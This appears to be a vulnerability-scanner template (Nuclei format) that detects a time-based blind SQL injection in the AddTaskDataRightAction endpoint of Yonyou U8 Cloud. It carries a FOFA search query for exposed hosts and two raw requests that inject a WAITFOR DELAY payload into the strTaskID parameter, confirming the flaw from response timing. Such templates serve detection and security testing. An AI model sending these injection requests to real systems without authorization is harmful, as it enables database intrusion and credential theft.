id: yongyouU8-Cloud-AddTaskDataRightAction-sql

info:
  name: "用友 U8 Cloud AddTaskDataRightAction 接口 SQL 时间盲注"
  author: Unknown
  severity: high
  description: |-
    fofa: title=="U8C"
      该接口因未正确过滤用户输入的恶意SQL语句，导致攻击者可通过时间延迟注入技术获取数据库敏感信息，包括但不限于管理员凭证及用户数据。在特定权限条件下，攻击者可能进一步利用该漏洞在服务器上植入恶意代码，从而控制服务器系统资源。
  reference:
  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487295&idx=1&sn=2c539286bf77ff262154f3a334790b3f&chksm=c267ba0cf510331a490f7c604ed69f4c361a906ee3dc40c0a76ee5cffc879cb6f21b64cba507&token=2053938247&lang=zh_CN#rd
  tags: 用友U8



http:
- raw:
  - |
    GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.task.AddTaskDataRightAction&method=execute&strTaskID=1%27);WAITFOR+DELAY+%270:0:4%27-- HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0

  - |
    GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.task.AddTaskDataRightAction&method=execute&strTaskID=1%27);WAITFOR+DELAY+%270:0:8%27-- HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0

  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and







